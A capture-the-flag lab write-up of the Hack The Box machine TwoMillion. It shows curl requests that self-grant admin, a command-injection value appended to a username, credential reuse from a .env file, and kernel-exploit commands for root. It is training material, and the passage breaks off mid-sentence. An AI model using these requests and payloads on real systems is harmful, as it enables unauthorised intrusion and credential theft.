# Hack The Box — TwoMillion

## Executive Summary

**TwoMillion** is an Easy-rated Linux machine on Hack The Box that commemorates the platform reaching two million users. Despite its Easy classification, the machine introduces a realistic attack chain that combines web application enumeration, API abuse, broken access control, command injection, credential harvesting, and Linux privilege escalation.

The engagement begins with discovering an old invitation-based registration system hidden within the web application's JavaScript files. By reversing the invite generation mechanism, a valid account can be created. Once authenticated, further API enumeration reveals multiple undocumented endpoints, one of which suffers from **Broken Access Control (OWASP A01:2021)**, allowing any authenticated user to promote themselves to an administrator.

Administrative privileges expose an additional API endpoint responsible for generating VPN configurations. This endpoint is vulnerable to **Blind OS Command Injection**, which is verified using a timing-based payload before being leveraged to obtain a reverse shell as the **www-data** user.

After gaining an initial foothold, sensitive configuration files reveal database credentials stored inside a **.env** file. Due to password reuse by the system administrator, these credentials also grant SSH access to the **admin** account.

Finally, local enumeration identifies an outdated Linux kernel vulnerable to **CVE-2023-0386 (OverlayFS Local Privilege Escalation)**. By exploiting this kernel vulnerability, root privileges are obtained and the machine is fully compromised.

This machine is an excellent demonstration of how multiple individually moderate vulnerabilities can be chained together into a complete compromise.

---

# Machine Information

| Category | Information |
|----------|-------------|
| Platform | Hack The Box |
| Machine | TwoMillion |
| Operating System | Linux |
| Difficulty | Easy |
| Primary Focus | Web Application Security & Linux Privilege Escalation |
| Author | Hack The Box |
| Skills Required | Basic Linux, HTTP, Web Enumeration |
| Skills Learned | API Enumeration, JavaScript Analysis, Broken Access Control, Command Injection, Credential Harvesting, Password Reuse, Kernel Exploitation |

---

# Learning Objectives

This machine provides hands-on experience with several important penetration testing concepts:

- Performing systematic web enumeration
- Analyzing JavaScript files to discover hidden functionality
- Understanding REST API structures
- Enumerating undocumented API endpoints
- Exploiting Broken Access Control vulnerabilities
- Identifying and validating Blind Command Injection
- Obtaining and stabilizing reverse shells
- Enumerating Linux systems after initial compromise
- Harvesting credentials from application configuration files
- Exploiting password reuse
- Performing Linux privilege escalation using a public kernel vulnerability
- Understanding how multiple vulnerabilities combine into a full attack chain

---

# Skills Demonstrated

## Web Enumeration

- Virtual Host Configuration
- HTTP Response Analysis
- Directory and Endpoint Discovery
- JavaScript Reverse Engineering
- Hidden Functionality Discovery

## API Security Testing

- REST API Enumeration
- HTTP Method Analysis
- Cookie Authentication
- Session Handling
- JSON Request Manipulation

## Web Exploitation

- Broken Access Control
- Privilege Escalation through API Abuse
- Blind OS Command Injection
- Reverse Shell Generation

## Post Exploitation

- Linux Enumeration
- Environment Variable Discovery
- Credential Harvesting
- Password Reuse
- SSH Authentication

## Privilege Escalation

- Kernel Enumeration
- OverlayFS Vulnerability Analysis
- CVE-2023-0386 Exploitation
- Root Compromise

---

# Lab Environment

| Component | Value |
|-----------|-------|
| Attacker Machine | Kali Linux |
| Target Machine | TwoMillion |
| VPN | Hack The Box VPN |
| Enumeration Tools | Nmap, Curl, Browser Developer Tools |
| Exploitation Tools | Curl, Netcat |
| Post-Exploitation Tools | SSH, Linux Enumeration Commands |
| Privilege Escalation | CVE-2023-0386 PoC |

---

# Attack Chain Overview

```text
Internet
     │
     ▼
Nmap Enumeration
     │
     ▼
Website Discovery
     │
     ▼
JavaScript Analysis
     │
     ▼
Hidden Invite API
     │
     ▼
Generate Invite Code
     │
     ▼
Register New Account
     │
     ▼
API Enumeration
     │
     ▼
Broken Access Control
     │
     ▼
Administrator Access
     │
     ▼
Blind Command Injection
     │
     ▼
Reverse Shell (www-data)
     │
     ▼
Read .env File
     │
     ▼
Credential Reuse
     │
     ▼
SSH as admin
     │
     ▼
Kernel Enumeration
     │
     ▼
CVE-2023-0386
     │
     ▼
ROOT
```

---

# Attack Chain (MITRE ATT&CK)

| Phase | Technique |
|--------|-----------|
| Reconnaissance | Active Scanning (T1595) |
| Resource Development | Acquire Infrastructure (N/A - HTB Lab) |
| Initial Access | Exploit Public-Facing Application (T1190) |
| Discovery | File and Directory Discovery (T1083) |
| Discovery | System Information Discovery (T1082) |
| Credential Access | Unsecured Credentials (T1552) |
| Execution | Command and Scripting Interpreter (T1059) |
| Persistence | Not Applicable |
| Privilege Escalation | Exploitation for Privilege Escalation (T1068) |
| Lateral Movement | Remote Services (SSH) (T1021) |
| Collection | Data from Local System (T1005) |

---

# Methodology

Rather than following a public walkthrough, this machine was solved using a structured penetration testing methodology.

The engagement followed these phases:

1. External reconnaissance
2. Web application enumeration
3. JavaScript analysis
4. REST API enumeration
5. Authentication bypass through Broken Access Control
6. Command Injection validation
7. Reverse shell acquisition
8. Local system enumeration
9. Credential harvesting
10. SSH authentication
11. Kernel vulnerability assessment
12. Local privilege escalation

Each step built upon information gathered during the previous phase, demonstrating the importance of careful enumeration and incremental exploitation.

---

# Why This Machine Is Valuable

Although categorized as an Easy machine, TwoMillion covers a wide range of real-world offensive security concepts frequently encountered during web application penetration tests.

Key topics include:

- Hidden functionality inside client-side JavaScript
- API reconnaissance
- REST endpoint discovery
- Broken Access Control (OWASP Top 10)
- Blind Command Injection
- Reverse Shell techniques
- Credential exposure via environment files
- Password reuse
- Linux post-exploitation
- Kernel privilege escalation

Because the compromise requires chaining multiple vulnerabilities together instead of relying on a single exploit, this machine provides an excellent introduction to realistic attack paths used during professional penetration tests.

# Initial Enumeration

## Objective

The objective of the initial enumeration phase was to identify exposed network services, determine the attack surface, and discover hidden functionality exposed by the web application.

As with any penetration test, no exploitation was performed until sufficient information had been gathered.

---

# Host Discovery

The target machine was provided by Hack The Box after connecting through the VPN.

The assigned IP address was:

```text
10.129.xxx.xxx
```

Since the target was already known, no host discovery scan was required.

---

# Port Enumeration

The first step was identifying open TCP ports using Nmap's default scripts and service version detection.

## Command

```bash
nmap -sC -sV 10.129.xxx.xxx
```

---

## Command Breakdown

| Flag | Purpose |
|-------|----------|
| `-sC` | Runs the default NSE (Nmap Scripting Engine) scripts |
| `-sV` | Attempts to identify service versions |
| Target | Target machine IP |

---

## Output

```text
PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    nginx

http-title:
Did not follow redirect to http://2million.htb/
```

---

## Enumeration Analysis

Only two ports were exposed:

| Port | Service | Importance |
|-------|----------|------------|
| 22 | SSH | Remote administration |
| 80 | HTTP | Primary attack surface |

Although SSH was available, no credentials were known at this stage, making the web server the primary target for further investigation.

The most interesting observation was the HTTP redirect:

```text
http://2million.htb
```

Instead of serving content directly through the IP address, the web server expected requests using a specific hostname.

---

# Virtual Host Configuration

Because the application redirected requests to a hostname instead of an IP address, local DNS resolution had to be configured manually.

The following entry was added to `/etc/hosts`.

```text
10.129.xxx.xxx    2million.htb
```

---

## Why This Works

When visiting:

```
http://10.129.xxx.xxx
```

the browser receives an HTTP redirect to:

```
http://2million.htb
```

Without a matching DNS record, the browser cannot resolve the hostname, preventing access to the website.

Adding an entry to `/etc/hosts` overrides DNS resolution locally and maps the hostname directly to the target IP.

---

# Website Enumeration

After updating the hosts file, the web application became accessible.

The landing page resembled an older version of the Hack The Box platform and featured several pages, including:

- Home
- Login
- Register
- Invite

The interface strongly suggested that registration required an invitation code.

At this point, obtaining a valid invite code became the primary objective.

---

# Inspecting the Web Application

Rather than immediately brute-forcing directories, the client-side application was inspected using the browser's Developer Tools.

The investigation focused on:

- HTML source
- Loaded JavaScript files
- Network requests
- Browser console

This approach often reveals hidden functionality implemented entirely on the client side.

---

# JavaScript Enumeration

While exploring the application, an interesting JavaScript file was discovered:

```text
/js/inviteapi.min.js
```

Because the file was minified, it was difficult to read directly.

Using the browser's **Pretty Print** feature reformatted the code into a readable structure.

---

## Why Pretty Print?

JavaScript distributed to browsers is commonly minified to reduce file size and improve page load performance.

For example:

```javascript
function a(){return b()}
```

may become

```javascript
function a(){return b()}
```

with all unnecessary whitespace removed.

Although functionally identical, minified code is difficult to analyze manually.

Pretty Print restores indentation and formatting, making reverse engineering significantly easier.

---

# Deobfuscating the Script

After formatting the file, the script revealed two important JavaScript functions:

```javascript
makeInviteCode()

verifyInviteCode()
```

Further analysis showed that these functions issued HTTP POST requests to undocumented API endpoints.

```text
POST /api/v1/invite/how/to/generate

POST /api/v1/invite/generate

POST /api/v1/invite/verify
```

This immediately indicated that invitation generation was handled entirely through the backend API rather than the visible web interface.

---

# Enumerating the Invite API

The first endpoint returned the following response:

```json
{
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr...",
    "enctype": "ROT13"
  }
}
```

Rather than returning the invite code directly, the server returned a message encoded using **ROT13**.

After decoding the string, the message became:

```text
In order to generate the invite code,
make a POST request to

/api/v1/invite/generate
```

---

# Generating an Invite Code

Following the server's instructions, the next endpoint was requested.

```bash
curl -X POST http://2million.htb/api/v1/invite/generate | jq
```

The response contained:

```json
{
  "code": "Mk1MTEUtRVpXRDYtWkpJNFEtREMwTzI=",
  "format": "encoded"
}
```

The returned value was Base64 encoded.

Decoding it produced a valid invitation code.

```bash
echo "Mk1MTEUtRVpXRDYtWkpJNFEtREMwTzI=" | base64 -d
```

Output:

```text
2MLLE-EZWD6-ZJI4Q-DC0O2
```

This code was accepted by the registration page, allowing a new user account to be created.

---

# Why This Worked

The application attempted to hide the invitation mechanism by exposing it only through client-side JavaScript.

However, because JavaScript executes entirely within the user's browser, every API endpoint referenced by the script is also visible to anyone inspecting the page.

By analyzing the JavaScript file instead of guessing endpoints, it was possible to:

1. Discover undocumented API routes.
2. Understand the invite generation workflow.
3. Decode the server's instructions.
4. Generate a legitimate invitation code.
5. Register a new account without prior authorization.

This demonstrates a common penetration testing principle:

> **Never trust hidden functionality implemented solely on the client side.**

If a browser can access an API endpoint, an attacker can access it as well.

---

# Pentester Notes

### Enumeration Techniques Used

- Service Enumeration
- Virtual Host Discovery
- Browser Developer Tools
- JavaScript Reverse Engineering
- API Endpoint Discovery
- HTTP POST Requests
- Response Analysis
- Encoding Identification (ROT13)
- Base64 Decoding

### Key Findings

- Web application required a valid invite code.
- Invite generation logic was exposed inside a client-side JavaScript file.
- Multiple undocumented API endpoints were discovered.
- The server relied on obscurity rather than proper authorization to protect the registration workflow.
- A valid account was successfully created without exploiting any vulnerability.

# API Enumeration & Privilege Escalation

## Objective

After successfully registering a new account, the next objective was to enumerate the application's authenticated functionality.

Unlike the previous phase, which focused on discovering the registration workflow, this phase concentrated on identifying hidden API endpoints, understanding the application's authorization model, and determining whether privileged functionality was adequately protected.

---

# Enumerating Available API Routes

After logging into the application, further inspection revealed an API endpoint that exposed every available route.

The route list contained both user and administrator functionality.

The discovered endpoints included:

## User Endpoints

| Method | Endpoint | Description |
|----------|-------------------------------|--------------------------------|
| GET | `/api/v1` | Route list |
| POST | `/api/v1/user/register` | Register account |
| POST | `/api/v1/user/login` | Login |
| GET | `/api/v1/user/auth` | Check authentication |
| GET | `/api/v1/user/vpn/generate` | Generate VPN |
| GET | `/api/v1/user/vpn/regenerate` | Regenerate VPN |
| GET | `/api/v1/user/vpn/download` | Download VPN |

---

## Administrator Endpoints

| Method | Endpoint | Description |
|----------|----------------------------------|--------------------------------|
| GET | `/api/v1/admin/auth` | Verify administrator status |
| POST | `/api/v1/admin/vpn/generate` | Generate VPN for users |
| PUT | `/api/v1/admin/settings/update` | Update user settings |

Immediately, several administrator endpoints became attractive targets.

---

# Authentication Verification

Before interacting with privileged endpoints, the authentication state of the current user was verified.

```bash
curl \
-b "PHPSESSID=<SESSION_COOKIE>" \
http://2million.htb/api/v1/user/auth | jq
```

Response:

```json
{
    "loggedin": true,
    "username": "devdan",
    "is_admin": 0
}
```

The session cookie confirmed that authentication was functioning correctly.

However, the account was not an administrator.

---

# Administrator Verification

Next, the administrator endpoint was queried.

```bash
curl \
-b "PHPSESSID=<SESSION_COOKIE>" \
http://2million.htb/api/v1/admin/auth | jq
```

Response:

```json
{
    "message": false
}
```

The application correctly recognized that the current user lacked administrative privileges.

At first glance, the authorization mechanism appeared to function as expected.

---

# Investigating the Settings Endpoint

Among all administrator endpoints, the following route appeared particularly interesting.

```text
PUT /api/v1/admin/settings/update
```

The endpoint name suggested that it modified user attributes.

Sending an empty request produced a helpful error message.

```bash
curl -X PUT \
-b "PHPSESSID=<SESSION_COOKIE>" \
-H "Content-Type: application/json" \
-d '{}' \
http://2million.htb/api/v1/admin/settings/update
```

Response:

```json
{
    "status":"danger",
    "message":"Missing parameter: email"
}
```

Instead of denying access, the application revealed which parameter was required.

---

# Enumerating Required Parameters

Adding the email parameter produced another response.

```json
{
    "status":"danger",
    "message":"Missing parameter: is_admin"
}
```

This revealed a second required parameter:

```text
is_admin
```

At this point, the request format became obvious.

```json
{
    "email":"user@2million.htb",
    "is_admin":1
}
```

---

# Exploiting Broken Access Control

The completed request was submitted.

```bash
curl -X PUT \
-b "PHPSESSID=<SESSION_COOKIE>" \
-H "Content-Type: application/json" \
-d '{
    "email":"devdan@2million.htb",
    "is_admin":1
}' \
http://2million.htb/api/v1/admin/settings/update
```

Response:

```json
{
    "id":13,
    "username":"devdan",
    "is_admin":1
}
```

The server successfully modified the account.

No administrator privileges were required.

---

# Verifying Privilege Escalation

The authentication endpoint was queried once again.

```bash
curl \
-b "PHPSESSID=<SESSION_COOKIE>" \
http://2million.htb/api/v1/user/auth | jq
```

Response:

```json
{
    "loggedin": true,
    "username": "devdan",
    "is_admin": 1
}
```

The account had now become an administrator.

The privilege escalation was complete.

---

# Why This Worked

The application trusted client-supplied input without verifying whether the authenticated user was authorized to modify privileged account attributes.

Instead of enforcing server-side authorization rules, the backend simply accepted:

```json
{
    "is_admin":1
}
```

and updated the database accordingly.

Because authorization was missing, any authenticated user could promote themselves to administrator.

This vulnerability belongs to one of the most dangerous categories in modern web security:

> **Broken Access Control**

---

# Security Analysis

The application correctly implemented **authentication**.

Users were required to:

- register
- login
- maintain a valid session cookie

However, authentication alone is not sufficient.

The application completely failed to perform **authorization**.

Instead of asking:

> "Is this user allowed to modify administrator settings?"

the server effectively asked:

> "Did the client include `is_admin` in the request?"

The server trusted user-controlled data.

This is a classic authorization failure.

---

# OWASP Top 10

This vulnerability falls under:

## A01:2021 — Broken Access Control

Broken Access Control occurs whenever an authenticated user is able to perform actions outside their intended permissions.

Common examples include:

- Accessing another user's resources
- Viewing administrator pages
- Changing privileged attributes
- Calling administrative APIs
- Bypassing role checks

Broken Access Control has consistently ranked as one of the most critical web application vulnerabilities because it often leads directly to complete application compromise.

---

# Why Error Messages Matter

One particularly interesting observation was how informative the API responses were.

Instead of returning:

```text
403 Forbidden
```

the server returned messages such as:

```text
Missing parameter: email
```

followed by

```text
Missing parameter: is_admin
```

These responses effectively documented the API for an attacker.

Each error revealed another required parameter, allowing the request structure to be reconstructed without any source code.

Excessively verbose error messages frequently accelerate penetration testing by leaking implementation details that should remain internal.

---

# Pentester Notes

### Techniques Used

- Session Cookie Analysis
- Authenticated API Enumeration
- HTTP Method Testing
- JSON Request Manipulation
- Error-Based Enumeration
- Authorization Testing

### Vulnerability Identified

- Broken Access Control (OWASP A01:2021)

### Impact

- Any authenticated user could become an administrator.
- Administrative API endpoints became accessible.
- The attack chain progressed toward remote code execution through administrator-only functionality.

### Lessons Learned

This stage demonstrates an important distinction between **authentication** and **authorization**.

Authentication answers the question:

> "Who are you?"

Authorization answers the question:

> "What are you allowed to do?"

The application implemented authentication correctly but completely failed to enforce authorization, allowing a normal user to escalate privileges by modifying a single JSON field.

# Command Injection & Initial Foothold

## Objective

With administrative privileges successfully obtained, the next objective was to identify administrator-only functionality that could lead to remote code execution.

During API enumeration, one endpoint immediately stood out:

```text
POST /api/v1/admin/vpn/generate
```

Based on its name, the endpoint appeared responsible for generating VPN configuration files for users.

Because it accepted user-controlled input and was only accessible to administrators, it became the primary target for further testing.

---

# Understanding the Endpoint

An empty request was sent to understand the expected request format.

```bash
curl -X POST \
-b "PHPSESSID=<SESSION_COOKIE>" \
-H "Content-Type: application/json" \
-d '{}' \
http://2million.htb/api/v1/admin/vpn/generate
```

Response:

```json
{
    "status":"danger",
    "message":"Missing parameter: username"
}
```

Instead of rejecting the request outright, the server revealed the required parameter.

This allowed the request format to be reconstructed.

```json
{
    "username":"devdan"
}
```

---

# Establishing Normal Behavior

Before attempting any exploitation, a legitimate request was submitted.

```bash
curl -X POST \
-b "PHPSESSID=<SESSION_COOKIE>" \
-H "Content-Type: application/json" \
-d '{
    "username":"devdan"
}' \
http://2million.htb/api/v1/admin/vpn/generate
```

The endpoint successfully returned an OpenVPN configuration file.

This established the baseline behavior of the application.

---

# Why Establish a Baseline?

Professional penetration testing is based on observing changes in application behavior.

Before testing malicious input, it is important to understand what a successful request looks like.

This allows any unexpected behavior to be attributed to the injected payload rather than normal application functionality.

---

# Investigating Command Injection

The endpoint accepted a single parameter:

```text
username
```

Because the parameter was likely used by a backend process responsible for generating VPN configurations, it became a candidate for OS Command Injection testing.

Instead of immediately attempting a reverse shell, harmless payloads were tested first.

This minimizes risk while confirming whether user input reaches the operating system.

---

# Blind Command Injection Validation

A timing-based payload was chosen.

```text
devdan;sleep 5
```

The request became:

```bash
time curl \
-X POST \
-b "PHPSESSID=<SESSION_COOKIE>" \
-H "Content-Type: application/json" \
-d '{
    "username":"devdan;sleep 5"
}' \
http://2million.htb/api/v1/admin/vpn/generate
```

The response returned after approximately:

```text
real    5.90s
```

The delay was reproducible across multiple requests.

---

# Why This Worked

The application most likely executed a system command similar to:

```bash
generate_vpn <username>
```

When the supplied username became:

```text
devdan;sleep 5
```

the shell interpreted it as two separate commands.

```bash
generate_vpn devdan
sleep 5
```

Because the second command intentionally paused execution, the HTTP response was delayed by approximately five seconds.

Even though no command output was returned, the delay proved that arbitrary operating system commands were being executed.

This is known as **Blind OS Command Injection**.

---

# Why Timing Attacks Matter

Not every command injection vulnerability returns command output.

Many production applications suppress standard output or discard command responses completely.

In these situations, attackers validate code execution indirectly.

Common techniques include:

- Time delays (`sleep`)
- DNS requests
- ICMP requests (`ping`)
- HTTP callbacks
- File creation

Timing attacks are among the safest methods because they do not modify the target system.

---

# Obtaining Remote Code Execution

After confirming command execution, the timing payload was replaced with a Bash reverse shell.

A Netcat listener was started on the attacker machine.

```bash
nc -lvnp 4444
```

The injected payload instructed the target machine to initiate an outbound connection back to the attacker's VPN address.

Once the vulnerable endpoint processed the request, the listener immediately received a connection.

```text
connect to [Attacker-IP]:4444

www-data@2million:/var/www/html$
```

The attacker had successfully obtained an interactive shell.

---

# Initial Enumeration

The first commands executed after gaining access were basic host identification commands.

```bash
whoami

id

hostname

pwd
```

Output:

```text
whoami

www-data

--------------------------------

id

uid=33(www-data)

--------------------------------

hostname

2million

--------------------------------

pwd

/var/www/html
```

The shell was running with the privileges of the web server.

---

# Enumerating the Web Application

Since the shell originated from the web application itself, the application's root directory became the first location to inspect.

Listing the contents revealed the application's configuration files.

One file immediately stood out.

```text
.env
```

Environment files commonly contain sensitive configuration values such as:

- Database credentials
- API tokens
- SMTP credentials
- Secret keys
- Application secrets

---

# Credential Harvesting

Displaying the contents of the file revealed database credentials.

```dotenv
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Although these credentials were intended for database authentication, they immediately became candidates for password reuse attacks.

---

# Password Reuse

Developers frequently reuse passwords across multiple services for convenience.

Rather than limiting testing to the database, the discovered credentials were also attempted against the SSH service.

Using:

```text
Username:
admin

Password:
SuperDuperPass123
```

SSH authentication succeeded.

```text
admin@2million:~$
```

The attack had progressed from a web server account to a legitimate system user.

---

# Why This Worked

The compromise was not caused by a second vulnerability.

Instead, it resulted from poor operational security.

The administrator reused the same password for:

- Database authentication
- Linux SSH authentication

Credential reuse remains one of the most common privilege escalation techniques encountered during penetration tests.

Whenever credentials are recovered, they should always be tested against other accessible services.

---

# Attack Chain So Far

```text
JavaScript Enumeration
        │
        ▼
Invite API
        │
        ▼
Register Account
        │
        ▼
Broken Access Control
        │
        ▼
Administrator Access
        │
        ▼
Blind Command Injection
        │
        ▼
Reverse Shell
        │
        ▼
www-data
        │
        ▼
Read .env
        │
        ▼
Credential Harvesting
        │
        ▼
Password Reuse
        │
        ▼
SSH as admin
```

---

# Security Analysis

This phase demonstrates how several moderate vulnerabilities can combine into a complete compromise.

Individually, each issue appears manageable.

- Administrator endpoint exposure
- Command Injection
- Sensitive configuration file
- Password reuse

Together, however, they formed a complete attack chain that moved the attacker from an unauthenticated user to a fully authenticated Linux account.

This highlights an important principle in offensive security:

> **Attackers exploit chains of weaknesses rather than isolated vulnerabilities.**

---

# Pentester Notes

### Techniques Used

- HTTP POST Request Manipulation
- Command Injection Testing
- Blind Timing Attack
- Reverse Shell
- Linux Enumeration
- Sensitive File Discovery
- Credential Harvesting
- Password Reuse

### Vulnerabilities Identified

- Blind OS Command Injection
- Sensitive Credentials Stored in `.env`
- Password Reuse

### Impact

- Remote Code Execution
- Initial Foothold as `www-data`
- Credential Disclosure
- Privilege Escalation to a Valid Linux User

### Lessons Learned

Always validate command injection using non-destructive payloads before attempting a reverse shell.

Additionally, every recovered credential should be considered a potential key to other services. Password reuse remains one of the simplest and most effective privilege escalation techniques encountered during real-world penetration tests.

# Privilege Escalation to Root

## Objective

After obtaining SSH access as the **admin** user, the final objective was to identify a local privilege escalation vector capable of obtaining root privileges.

Rather than immediately searching for public exploits, a systematic local enumeration was performed first to identify common privilege escalation opportunities.

---

# Local Enumeration

The initial host information was collected.

```bash
whoami

id

hostname

pwd

uname -a
```

Output:

```text
admin

uid=1000(admin)

hostname
2million

pwd
/home/admin

Linux 2million 5.15.70-051570-generic
```

The kernel version immediately attracted attention.

```text
5.15.70-051570-generic
```

This version was known to be vulnerable to several public privilege escalation vulnerabilities.

However, kernel exploitation should always be considered the **last option**, after exhausting simpler privilege escalation techniques.

---

# Enumerating SUID Binaries

The first step was identifying binaries running with the SUID permission bit.

## Command

```bash
find / -perm -4000 -type f 2>/dev/null
```

The output contained only standard Ubuntu binaries.

Examples included:

```text
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/mount
/usr/bin/chsh
/usr/bin/su
/usr/lib/snapd/snap-confine
```

No unusual SUID binaries or GTFOBins candidates were identified.

---

# Enumerating Linux Capabilities

Next, Linux capabilities were enumerated.

## Command

```bash
getcap -r / 2>/dev/null
```

Output:

```text
/usr/bin/ping
/usr/bin/mtr-packet
gst-ptp-helper
```

Again, only default capabilities were present.

No binaries possessed dangerous capabilities such as:

- `cap_setuid`
- `cap_sys_admin`
- `cap_dac_override`

No privilege escalation opportunities were identified.

---

# User Flag

While enumerating the user's home directory, the user flag was successfully obtained.

```bash
cat ~/user.txt
```

---

# Mail Enumeration

One of the most overlooked privilege escalation techniques is inspecting local mailboxes.

Linux systems commonly store user mail under:

```text
/var/mail/

/var/spool/mail/
```

Listing the mail directory revealed a mailbox for the administrator.

```bash
cat /var/mail/admin
```

The email contained the following message.

```text
Subject:
Urgent: Patch System OS

...

There have been a few serious Linux kernel CVEs already this year.

That one in OverlayFS / FUSE looks nasty.

We can't get popped by that.
```

---

# Why This Was Important

Although the email itself did not contain credentials, it provided an extremely valuable clue.

It confirmed that:

- The administrators were aware of an OverlayFS vulnerability.
- The operating system had **not yet been patched**.
- The intended privilege escalation path likely involved a Linux kernel exploit.

This is an example of **information disclosure** assisting privilege escalation.

---

# Kernel Analysis

The kernel version was compared against known Linux privilege escalation vulnerabilities.

The installed version:

```text
5.15.70
```

matched the vulnerable versions affected by:

> **CVE-2023-0386**

This vulnerability affects the Linux OverlayFS implementation and allows local users to obtain root privileges.

---

# Understanding CVE-2023-0386

## What is OverlayFS?

OverlayFS is a Linux filesystem that combines multiple filesystem layers into a single unified view.

It is commonly used by:

- Docker
- Podman
- LXC
- Container runtimes
- Snap packages

Conceptually:

```text
Upper Layer
      ▲
      │
Merged Filesystem
      │
      ▼
Lower Layer
```

Applications interact with the merged filesystem while OverlayFS manages the underlying layers.

---

## Root Cause

The vulnerability exists because OverlayFS improperly validates file ownership when copying files between filesystem layers.

An attacker can abuse this flaw to create a file that unexpectedly gains **root ownership and the SUID permission bit**.

Once a malicious SUID binary is created, executing it results in a root shell.

---

# Obtaining the Public PoC

Since no simpler privilege escalation vector existed, a public Proof of Concept (PoC) for **CVE-2023-0386** was used.

The exploit source was transferred to the target machine and compiled locally.

```bash
make all
```

Compilation produced several binaries, including:

```text
exp
fuse
gc
```

The compiler emitted several warnings but completed successfully.

---

# Running the Exploit

The exploit required two simultaneous terminals.

## Terminal 1

The FUSE filesystem was started.

```bash
./fuse ./ovlcap/lower ./gc
```

This process intentionally remained running.

---

## Terminal 2

The exploit binary was executed.

```bash
./exp
```

Output:

```text
[+] mount success

[+] exploit success!
```

The exploit successfully created a SUID binary.

---

## Obtaining Root

Finally, the generated helper binary was executed.

```bash
./gc
```

The shell immediately changed to:

```text
root@2million
```

Verification:

```bash
whoami

id
```

Output:

```text
root

uid=0(root)
```

The privilege escalation was complete.

---

# Root Flag

With full administrative privileges obtained, the final flag was collected.

```bash
cat /root/root.txt
```

---

# Alternative Privilege Escalation

While solving the machine, Hack The Box also highlighted an alternative privilege escalation path.

The installed GNU C Library version was:

```bash
ldd --version
```

Output:

```text
GLIBC 2.35
```

This version was also associated with:

> **CVE-2023-4911 — Looney Tunables**

Unlike the intended OverlayFS exploit, this vulnerability targets the GNU C dynamic loader.

The vulnerable environment variable is:

```text
GLIBC_TUNABLES
```

Although this alternative path was not used during exploitation, it demonstrates that a single system may contain multiple independent privilege escalation vectors.

---

# Why This Worked

Privilege escalation succeeded because the operating system was running an outdated Linux kernel vulnerable to a publicly known exploit.

Importantly, kernel exploitation was **not** the first technique attempted.

The decision to exploit the kernel was made only after:

- Enumerating SUID binaries
- Enumerating Linux capabilities
- Checking sudo permissions
- Inspecting configuration files
- Enumerating local mail
- Confirming the vulnerable kernel version

This reflects real-world penetration testing methodology, where kernel exploits are generally considered a last resort due to their complexity and potential instability.

---

# Attack Chain

```text
Reverse Shell (www-data)
        │
        ▼
Read .env
        │
        ▼
Credential Reuse
        │
        ▼
SSH as admin
        │
        ▼
Local Enumeration
        │
        ▼
Mail Enumeration
        │
        ▼
Kernel Analysis
        │
        ▼
CVE-2023-0386
        │
        ▼
ROOT
```

---

# Pentester Notes

## Techniques Used

- Linux Enumeration
- SUID Enumeration
- Linux Capabilities Enumeration
- Mail Enumeration
- Kernel Version Identification
- Public CVE Mapping
- OverlayFS Exploitation
- Root Verification

---

## Vulnerabilities Identified

- Outdated Linux Kernel
- CVE-2023-0386 (OverlayFS Local Privilege Escalation)
- Information Disclosure via Local Mail
- Alternative Vulnerability: CVE-2023-4911 (Looney Tunables)

---

## Lessons Learned

Kernel exploits should never be the first privilege escalation technique attempted.

Effective penetration testing relies on disciplined enumeration and eliminating simpler attack paths before resorting to complex kernel exploitation.

This machine demonstrates that successful privilege escalation is often the result of combining careful enumeration with public vulnerability research rather than immediately executing an exploit.

# Conclusion

## Executive Summary

The **TwoMillion** machine demonstrated how multiple seemingly independent weaknesses can be chained together into a complete system compromise. Rather than relying on a single critical vulnerability, the attack succeeded through careful enumeration, logical analysis, and exploiting several security issues in sequence.

The compromise followed a realistic penetration testing workflow:

```text
External Enumeration
        │
        ▼
JavaScript Analysis
        │
        ▼
Invite API Discovery
        │
        ▼
Account Registration
        │
        ▼
API Enumeration
        │
        ▼
Broken Access Control
        │
        ▼
Administrator Privileges
        │
        ▼
Blind Command Injection
        │
        ▼
Reverse Shell
        │
        ▼
Credential Harvesting (.env)
        │
        ▼
Password Reuse
        │
        ▼
SSH Access
        │
        ▼
Kernel Enumeration
        │
        ▼
CVE-2023-0386
        │
        ▼
ROOT
```

This machine is an excellent example of how proper enumeration is often more valuable than immediately attempting exploitation.

---

# Challenges Encountered During the Lab

One of the most valuable aspects of this machine was not simply obtaining root privileges, but learning from the mistakes and troubleshooting process along the way.

Below are several issues encountered during the assessment and the reasoning used to overcome them.

---

# Challenge 1 — Accessing the Website

## Problem

The website redirected every request to:

```text
http://2million.htb
```

Attempting to browse using only the target IP resulted in a redirect that could not be resolved.

---

## Initial Assumption

At first, it appeared that the web application was unavailable.

---

## Investigation

The Nmap scan revealed:

```text
Did not follow redirect to http://2million.htb/
```

This indicated that the application expected a specific hostname instead of direct IP access.

---

## Solution

A local hosts file entry was added.

```text
10.129.xxx.xxx    2million.htb
```

---

## Lesson Learned

Always pay attention to HTTP redirects during enumeration.

Redirects often reveal:

- Virtual hosts
- Internal domain names
- Application routing
- Hidden infrastructure

---

# Challenge 2 — Reading Minified JavaScript

## Problem

The discovered JavaScript file appeared unreadable.

```text
inviteapi.min.js
```

Everything existed on a single line.

---

## Initial Assumption

Initially, it seemed impossible to understand the application's logic.

---

## Investigation

Using the browser's **Pretty Print** feature reformatted the code into readable JavaScript.

This immediately revealed several hidden API endpoints.

---

## Solution

Developer Tools

↓

Pretty Print

↓

Readable JavaScript

---

## Lesson Learned

Minified JavaScript is not encrypted.

Formatting alone is often enough to expose valuable client-side functionality.

---

# Challenge 3 — Misidentifying the Encoding

## Problem

The server returned:

```json
{
    "enctype":"ROT13"
}
```

---

## Initial Assumption

The encoded string initially looked similar to Base64.

---

## Investigation

The API explicitly returned:

```text
ROT13
```

After decoding the ROT13 message, the instructions revealed another API endpoint responsible for generating invitation codes.

The generated invite code itself was then Base64 encoded.

---

## Solution

Two different encoding schemes were involved:

1. ROT13

↓

Instructions

2. Base64

↓

Invitation Code

---

## Lesson Learned

Never assume the encoding format.

Always inspect metadata and API responses carefully before decoding.

---

# Challenge 4 — Administrator Endpoint Returning HTTP 405

## Problem

Accessing:

```text
/api/v1/admin/settings/update
```

initially produced:

```text
405 Method Not Allowed
```

---

## Initial Assumption

The endpoint appeared inaccessible.

---

## Investigation

The issue was not authentication.

The incorrect HTTP method was being used.

The endpoint required:

```text
PUT
```

instead of:

```text
GET
```

---

## Solution

The request was resent using:

